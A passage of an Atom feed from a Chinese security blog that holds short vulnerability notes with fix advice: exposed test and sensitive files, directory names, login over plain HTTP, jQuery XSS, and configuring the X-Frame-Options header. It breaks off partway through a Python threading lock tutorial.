      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：测试文件&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;Web应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="测试文件" scheme="https://www.teamssix.com/tags/%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】敏感文件</title>
    <link href="https://www.teamssix.com/year/191123-174558.html"/>
    <id>https://www.teamssix.com/year/191123-174558.html</id>
    <published>2019-11-23T09:45:58.000Z</published>
    <updated>2019-11-23T09:55:31.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：敏感文件</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>由于网站运维人员疏忽，存放敏感信息的文件被泄露或由于网站运行出错导致敏感信息泄露。</p><p>Web应用程序显露了某些文件名称，此信息可以帮助攻击者对站点进一步的攻击。例如，知道文件名称之后，攻击者便可能获得它的内容，也许还能猜出其它的文件名或目录名，并尝试访问它们。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p><p>攻击者可能通过文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>对网站错误信息进行统一返回，模糊化处理；对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p><p>修改复杂的文件名称；从站点中除去不需要的文件。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：敏感文件&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;由于网站运维人员疏忽，存放敏感信息的文件被泄露或由于网站运行出错导致敏感信息泄露。&lt;/p&gt;
&lt;p&gt;Web应用程序显露了某些文件名称，此信息可以帮助攻击者对站点进一步的攻击。例如，知道文件名称之后，攻击者便可能获得它的内容，也许还能猜出其它的文件名或目录名，并尝试访问它们。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="敏感文件" scheme="https://www.teamssix.com/tags/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】敏感目录</title>
    <link href="https://www.teamssix.com/year/191123-174550.html"/>
    <id>https://www.teamssix.com/year/191123-174550.html</id>
    <published>2019-11-23T09:45:50.000Z</published>
    <updated>2019-11-23T09:55:35.259Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：敏感目录</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>目标服务器上存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。</p><p>Web应用程序显露了某些目录名称，此信息可以帮助攻击者对站点进一步的攻击。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>如果这些名称敏感的目录中包含了危险的功能或信息，恶意攻击者有可能利用这些脚本或信息直接获取目标服务器的控制权或基于这些信息实施进一步的攻击。</p><p>知道目录之后，攻击者便可能获得目录下边的文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>如果这些目录中包含了敏感内容，可以使用非常规的目录名称，如果能删除也可以删除或者正确设置权限，禁止用户访问。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions" target="_blank" rel="noopener">https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：敏感目录&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;目标服务器上存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。&lt;/p&gt;
&lt;p&gt;Web应用程序显露了某些目录名称，此信息可以帮助攻击者对站点进一步的攻击。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="敏感目录" scheme="https://www.teamssix.com/tags/%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】基于HTTP连接的登录请求</title>
    <link href="https://www.teamssix.com/year/191121-220054.html"/>
    <id>https://www.teamssix.com/year/191121-220054.html</id>
    <published>2019-11-21T14:00:54.000Z</published>
    <updated>2019-11-21T14:02:47.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：基于HTTP连接的登录请求</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>应用程序使用HTTP连接接受客户端的登录请求，如果登录请求数据没有加密处理，有可能被攻击者嗅探到客户提交的请求数据，请求数据中一般包含用户名密码。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>可能被同一个局域网内的攻击者嗅探到用户输入的登录数据，如账号和密码。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>在提交登录请求数据前加密请求数据或使用HTTPS连接发送登录请求数据。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://blog.csdn.net/CHS007chs/article/details/52524322" target="_blank" rel="noopener">https://blog.csdn.net/CHS007chs/article/details/52524322</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：基于HTTP连接的登录请求&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;应用程序使用HTTP连接接受客户端的登录请求，如果登录请求数据没有加密处理，有可能被攻击者嗅探到客户提交的请求数据，请求数据中一般包含用户名密码。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="HTTP" scheme="https://www.teamssix.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】jQuery跨站脚本</title>
    <link href="https://www.teamssix.com/year/191120-214129.html"/>
    <id>https://www.teamssix.com/year/191120-214129.html</id>
    <published>2019-11-20T13:41:29.000Z</published>
    <updated>2019-11-20T14:03:21.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：jQuery跨站脚本</p><p>风险等级：低危</p><p>问题类型：使用已知漏洞的组件</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>关于jQuery：jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。</p><a id="more"></a><p>漏洞原理：jQuery中过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 location.hash跨站漏洞</p><p>影响版本：</p><p>jquery-1.7.1~1.8.3</p><p>jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p><p>jquery-1.2~1.5</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>jQuery 1.4.2版本中，远程攻击者可利用该漏洞向页面中注入任意的HTML。</p><p>jQuery 1.6.3之前版本中，当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。</p><p>jQuery 3.0.0之前版本中，攻击者可利用该漏洞执行客户端代码。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href="https://jquery.com/" target="_blank" rel="noopener">https://jquery.com/</a></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="http://www.word666.com/wangluo/121052.html" target="_blank" rel="noopener">http://www.word666.com/wangluo/121052.html</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/89811603" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/89811603</a><br><a href="https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html" target="_blank" rel="noopener">https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：jQuery跨站脚本&lt;/p&gt;
&lt;p&gt;风险等级：低危&lt;/p&gt;
&lt;p&gt;问题类型：使用已知漏洞的组件&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;关于jQuery：jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="jQuery" scheme="https://www.teamssix.com/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】X-Frame-Options Header未配置</title>
    <link href="https://www.teamssix.com/year/191119-144643.html"/>
    <id>https://www.teamssix.com/year/191119-144643.html</id>
    <published>2019-11-19T06:46:43.000Z</published>
    <updated>2019-11-20T13:58:02.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：X-Frame-Options Header未配置</p><p>风险等级：低危</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;忽略frame&gt;,&lt;忽略iframe&gt;,&lt;忽略embed&gt;或者&lt;忽略object&gt;中展现的标记。</p><p>网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，从而避免点击劫持（clickjacking）攻击。</p><p>X-Frame-Options有三个值：</p><a id="more"></a><h3 id="deny"><a href="#deny" class="headerlink" title="deny"></a>deny</h3><p>表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</p><h3 id="sameorigin"><a href="#sameorigin" class="headerlink" title="sameorigin"></a>sameorigin</h3><p>表示该页面可以在相同域名页面的 frame 中展示。</p><h3 id="allow-from-uri"><a href="#allow-from-uri" class="headerlink" title="allow-from uri"></a>allow-from uri</h3><p>表示该页面可以在指定来源的 frame 中展示。</p><p>换一句话说，如果设置为DENY，不光在别人的网站frame嵌入时会无法加载，在同域名页面中同样会无法加载。</p><p>另一方面，如果设置为SAMEORIGIN，那么页面就可以在同域名页面的frame中嵌套。正常情况下我们通常使用SAMEORIGIN参数。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可以使用一个透明的、不可见的iframe，覆盖在目标网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上，导致被劫持。</p><p>也就是说网站内容可能被其他站点引用，可能遭受到点击劫持攻击。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><h3 id="配置-Apache"><a href="#配置-Apache" class="headerlink" title="配置 Apache"></a>配置 Apache</h3><p>配置 Apache 在所有页面上发送 X-Frame-Options 响应头，需要把下面这行添加到 ‘site’ 的配置中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header always set X-Frame-Options &quot;sameorigin&quot;</span><br></pre></td></tr></table></figure><p>要将 Apache 的配置 X-Frame-Options 设置成 deny , 按如下配置去设置你的站点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set X-Frame-Options &quot;deny&quot;</span><br></pre></td></tr></table></figure><p>要将 Apache 的配置 X-Frame-Options 设置成 allow-from，在配置里添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set X-Frame-Options &quot;allow-from https://example.com/&quot;</span><br></pre></td></tr></table></figure><h3 id="配置-nginx配置"><a href="#配置-nginx配置" class="headerlink" title="配置 nginx配置"></a>配置 nginx配置</h3><p>nginx 发送 X-Frame-Options 响应头，把下面这行添加到 ‘http’, ‘server’ 或者 ‘location’ 的配置中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header X-Frame-Options sameorigin always;</span><br></pre></td></tr></table></figure><h3 id="配置-IIS配置"><a href="#配置-IIS配置" class="headerlink" title="配置 IIS配置"></a>配置 IIS配置</h3><p>IIS 发送 X-Frame-Options 响应头，添加下面的配置到 Web.config 文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.webServer&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;httpProtocol&gt;</span><br><span class="line">    &lt;customHeaders&gt;</span><br><span class="line">      &lt;add name=&quot;X-Frame-Options&quot; value=&quot;sameorigin&quot; /&gt;</span><br><span class="line">    &lt;/customHeaders&gt;</span><br><span class="line">  &lt;/httpProtocol&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/system.webServer&gt;</span><br></pre></td></tr></table></figure><h3 id="配置-HAProxy"><a href="#配置-HAProxy" class="headerlink" title="配置 HAProxy"></a>配置 HAProxy</h3><p>配置 HAProxy 发送 X-Frame-Options 头，添加这些到你的前端、监听 listen，或者后端的配置里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rspadd X-Frame-Options:\ sameorigin</span><br></pre></td></tr></table></figure><p>或者，在更加新的版本中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http-response set-header X-Frame-Options sameorigin</span><br></pre></td></tr></table></figure><h3 id="配置-Express"><a href="#配置-Express" class="headerlink" title="配置 Express"></a>配置 Express</h3><p>要配置 Express 可以发送 X-Frame-Options header，你可以用借助了 frameguard 来设置头部的 helmet。在你的服务器配置里面添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const helmet = require(&apos;helmet&apos;);</span><br><span class="line">const app = express();</span><br><span class="line">app.use(helmet.frameguard(&#123; action: &quot;sameorigin&quot; &#125;));</span><br></pre></td></tr></table></figure><p>或者，你也可以直接用 frameguard：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const frameguard = require(&apos;frameguard&apos;)</span><br><span class="line">app.use(frameguard(&#123; action: &apos;sameorigin&apos; &#125;))</span><br></pre></td></tr></table></figure><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://blog.whsir.com/post-3919.html" target="_blank" rel="noopener">https://blog.whsir.com/post-3919.html</a><br><a href="https://blog.csdn.net/qq_25934401/article/details/81384876" target="_blank" rel="noopener">https://blog.csdn.net/qq_25934401/article/details/81384876</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：X-Frame-Options Header未配置&lt;/p&gt;
&lt;p&gt;风险等级：低危&lt;/p&gt;
&lt;p&gt;问题类型：管理员设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在&amp;lt;忽略frame&amp;gt;,&amp;lt;忽略iframe&amp;gt;,&amp;lt;忽略embed&amp;gt;或者&amp;lt;忽略object&amp;gt;中展现的标记。&lt;/p&gt;
&lt;p&gt;网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，从而避免点击劫持（clickjacking）攻击。&lt;/p&gt;
&lt;p&gt;X-Frame-Options有三个值：&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="X-Frame-Options" scheme="https://www.teamssix.com/tags/X-Frame-Options/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】6、锁lock</title>
    <link href="https://www.teamssix.com/year/191105-121011.html"/>
    <id>https://www.teamssix.com/year/191105-121011.html</id>
    <published>2019-11-05T04:10:11.000Z</published>
    <updated>2019-11-05T04:24:19.696Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><p><a href="https://www.teamssix.com/year/191103-092239.html">4、Queue功能</a></p><p><a href="https://www.teamssix.com/year/191104-101112.html">5、不一定有效率GIL</a></p><h1 id="0x00-关于线程锁lock"><a href="#0x00-关于线程锁lock" class="headerlink" title="0x00 关于线程锁lock"></a>0x00 关于线程锁lock</h1><p>多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。</p><p>而使用lock就可以在不同线程使用同一共享内存时，能够确保线程之间互不影响。</p><a id="more"></a><h1 id="0x01-不使用lock锁的情况"><a href="#0x01-不使用lock锁的情况" class="headerlink" title="0x01 不使用lock锁的情况"></a>0x01 不使用lock锁的情况</h1><p>job1：全局变量A的值每次加1，循环7次并打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br></pre></td></tr></table></figure><p>job2：全局变量A的值每次加10，循环7次并打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br></pre></td></tr></table></figure><p>main：定义两个线程并执行job1和job2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> <span class="comment"># 定义两个线程并执行job1和job2</span></span><br><span class="line">   t1 = threading.Thread(target=job1)</span><br><span class="line">   t2 = threading.Thread(target=job2)</span><br><span class="line">   t1.start()</span><br><span class="line">   t2.start()</span><br><span class="line">   t1.join()</span><br><span class="line">   t2.join()</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> <span class="comment"># 定义两个线程并执行job1和job2</span></span><br><span class="line">   t1 = threading.Thread(target=job1)</span><br><span class="line">   t2 = threading.Thread(target=job2)</span><br><span class="line">   t1.start()</span><br><span class="line">   t2.start()</span><br><span class="line">  